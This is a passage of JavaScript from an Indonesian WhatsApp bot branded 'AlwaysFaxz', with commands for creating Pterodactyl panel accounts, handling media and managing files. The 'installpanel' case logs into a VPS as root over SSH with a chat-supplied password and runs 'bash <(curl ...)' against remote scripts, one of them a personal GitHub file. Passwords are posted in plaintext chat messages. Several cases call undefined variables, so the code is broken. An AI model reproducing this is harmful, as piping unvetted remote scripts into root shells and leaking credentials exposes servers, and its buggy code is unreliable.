const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
}
break
            case 'tourl': {
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyalwaysfaxz(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyalwaysfaxz(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'to1×':
            case '1×': 
            case 'toviewonce': {
                if (!quoted) return replyalwaysfaxz(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
                    AlwaysFaxzMd.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
                    AlwaysFaxzMd.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyalwaysfaxz(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await AlwaysFaxzMd.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyalwaysfaxz(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyalwaysfaxz(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replyalwaysfaxz(teks)
            }
            break
            case 'ai':
case 'openai':
case 'open-ai': {
	if (!text) return replyalwaysfaxz(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Open AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./lib/system/openai.jpg')}, { upload: AlwaysFaxzMd.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},
            {
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice Open Ai ✨","id":".mangap"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363204138641225@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
await AlwaysFaxzMd.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replyalwaysfaxz("`Error Kak :(`")
}
}
break
case 'mangap': {
replyalwaysfaxz(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break
            case 'addowner':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
if (!args[0]) return replyalwaysfaxz(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await AlwaysFaxzMd.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyalwaysfaxz(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyalwaysfaxz(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
if (!args[0]) return replyalwaysfaxz(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyalwaysfaxz(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addsticker': {
                if (!isPremium) return replyalwaysfaxz(mess.prem)
                if (args.length < 1) return replyalwaysfaxz('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replyalwaysfaxz("Name Already In Use")
                let delb = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./lib/system/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replyalwaysfaxz(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replyalwaysfaxz(mess.prem)
                if (args.length < 1) return replyalwaysfaxz('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replyalwaysfaxz("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerAlwaysFaxzMd.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./lib/system/sticker/${q}.webp`)
                replyalwaysfaxz(`Successfully Removed Sticker ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replyalwaysfaxz("This name is already in use")
let delb = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./lib/system/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replyalwaysfaxz(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replyalwaysfaxz("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./lib/system/zip/${teks}.zip`)
replyalwaysfaxz(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replyalwaysfaxz(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replyalwaysfaxz("This name is already in use")
let delb = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./lib/system/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replyalwaysfaxz(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replyalwaysfaxz("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./lib/system/apk/${teks}.apk`)
replyalwaysfaxz(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replyalwaysfaxz(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replyalwaysfaxz("This name is already in use")
let delb = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./lib/system/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replyalwaysfaxz(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyalwaysfaxz(mess.prem)
await loading()
if (args.length < 1) return replyalwaysfaxz('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replyalwaysfaxz("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./lib/system/doc/${teks}.pdf`)
replyalwaysfaxz(`Successfully deleted pdf ${teks}`)
}
}
break
case 'menuinstaller': case 'installmenu': {
replyalwaysfaxz(`\n> ★ *\`MENU INSTALER\`* ★\n> <==================>\n> *•> installpanel*\n> *•> uninstallpanel*\n> *•> startwings*\n> *•> thema1*\n> *•> thema2*\n> *•> thema3*\n> *•> uninstallthema*\n> <==================>\n© AlwaysFaxz\n`)
}
break
case 'installpanel': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    let t = text.split(',');
    if (t.length < 5) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        replyalwaysfaxz('*PROSES CIK*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        replyalwaysfaxz('*PROSES PENGINSTALLAN WINGS CIK*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)';
        replyalwaysfaxz('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        replyalwaysfaxz(`📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('faxzsygnindya\n');
